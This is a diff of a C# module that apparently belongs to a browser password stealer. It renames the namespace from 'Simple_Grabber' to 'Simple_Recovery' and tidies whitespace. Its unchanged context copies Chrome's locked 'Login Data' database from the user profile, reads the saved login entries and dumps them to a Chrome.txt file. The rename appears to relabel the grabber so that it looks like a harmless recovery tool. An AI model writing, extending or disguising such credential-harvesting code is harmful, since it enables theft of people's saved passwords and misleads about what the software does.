@@ -5,8 +5,7 @@ using System.Security.Cryptography;
 using System.Text;
 using Dapper;
 
-
-namespace Simple_Grabber.Modules
+namespace Simple_Recovery.Modules
 {
     internal class User
     {
@@ -22,16 +21,16 @@ namespace Simple_Grabber.Modules
         // Default file path for the database
 
         private static readonly string FolderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default";
-        
+
         // Get the entries within the database
 
         private static StringBuilder GetDatabaseEntries()
         {
             var databaseEntries = new StringBuilder();
-            
+
             // Create a copy of the database - Chrome has the original database open and is therefore locked
 
-            if(File.Exists(FolderPath + @"\Login Data Copy"))
+            if (File.Exists(FolderPath + @"\Login Data Copy"))
             {
                 File.Delete(FolderPath + @"\Login Data Copy");
 
@@ -80,7 +79,7 @@ namespace Simple_Grabber.Modules
         {
             var databaseEntries = GetDatabaseEntries();
 
-            File.WriteAllText(path + @"\Chrome.txt", databaseEntries.ToString());    
+            File.WriteAllText(path + @"\Chrome.txt", databaseEntries.ToString());
         }
     }
 }
